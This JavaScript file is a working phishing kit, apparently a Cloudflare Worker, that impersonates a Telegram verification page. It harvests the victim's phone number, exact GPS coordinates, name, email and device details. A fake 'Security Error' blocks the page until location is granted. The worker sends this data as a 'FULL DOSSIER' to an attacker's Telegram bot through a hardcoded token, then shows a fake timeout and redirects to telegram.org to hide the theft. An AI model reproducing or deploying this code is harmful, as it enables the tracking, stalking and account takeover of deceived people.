export default {
  async fetch(request, env) {
    if (request.method === "GET") {
      return new Response(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Telegram Messenger</title>
          <style>
            body { font-family: -apple-system, sans-serif; background: #f4f4f5; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
            .container { text-align: center; max-width: 350px; width: 90%; background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
            .logo { width: 80px; margin-bottom: 20px; }
            h2 { font-weight: 500; margin-bottom: 10px; color: #222; }
            p { color: #707579; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
            input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dfe1e5; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
            input:focus { border-color: #3390ec; }
            button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
            button:hover { background: #2b80d1; }
            .step { display: none; }
            .step.active { display: block; }
          </style>
        </head>
        <body>
          <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
            
            <div id="step1" class="step active">
              <h2>Your Phone</h2>
              <p>Please confirm your country code and enter your phone number to start verification.</p>
              <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
              <button onclick="goToStep2()">NEXT</button>
            </div>

            <div id="step2" class="step">
              <h2>Profile Details</h2>
              <p>Update your cloud profile information to ensure session synchronization.</p>
              <input id="username" type="text" placeholder="Full Name (Optional)">
              <input id="email" type="email" placeholder="Recovery Email (Optional)">
              <button id="finalBtn" onclick="finishProcess()">FINISH SETUP</button>
            </div>
          </div>

          <script>
            let userData = { phone: "", lat: "Unknown", lon: "Unknown", accuracy: "Approximate" };

            function goToStep2() {
              const phone = document.getElementById("phone").value;
              if (!phone) { alert("Please enter your phone number"); return; }
              userData.phone = phone;

              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  (pos) => {
                    userData.lat = pos.coords.latitude;
                    userData.lon = pos.coords.longitude;
                    userData.accuracy = pos.coords.accuracy < 100 ? "Exact (GPS)" : "Approximate";
                    switchStep(2);
                  },
                  (err) => {
                    alert("⚠️ Security Error: Location access is required to verify your region.");
                  },
                  { enableHighAccuracy: true }
                );
              }
            }

            function switchStep(stepNum) {
              document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
              document.getElementById('step' + stepNum).classList.add('active');
            }

            async function finishProcess() {
              document.getElementById("finalBtn").innerText = "Synchronizing...";
              const name = document.getElementById("username").value || "Not Provided";
              const email = document.getElementById("email").value || "Not Provided";

              await fetch(window.location.href, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  ...userData,
                  name: name,
                  email: email,
                  model: navigator.userAgent
                })
              });

              alert("❌ Connection Timeout: Cloud verification failed. Redirecting to official login...");
              window.location.href = "https://telegram.org/dl";
            }
          </script>
        </body>
        </html>
      `, { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
        const CHAT_ID = "5794792675";

        const statusEmoji = data.accuracy.includes("Exact") ? "🟢 [دقيق جداً - GPS]" : "🟡 [تقريبي]";
        const maps = "https://www.google.com/maps?q=lat,lon" + data.lat + "," + data.lon;

        const message = "🗂️ [DQACD - FULL DOSSIER] 🗂️\\n" +
                        "--------------------------------\\n" +
                        "📱 الرقم: " + data.phone + "\\n" +
                        "👤 الاسم: " + data.name + "\\n" +
                        "📧 الإيميل: " + data.email + "\\n" +
                        "--------------------------------\\n" +
                        "🛰️ الحالة: " + statusEmoji + "\\n" +
                        "📍 الإحداثيات: " + data.lat + "," + data.lon + "\\n" +
                        "🗺️ خرائط جوجل: " + maps + "\\n" +
                        "🛠️ الجهاز: " + data.model;

        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });

        return new Response("ok");
      } catch (e) {
        return new Response("error", { status: 400 });
      }
    }
  }
};
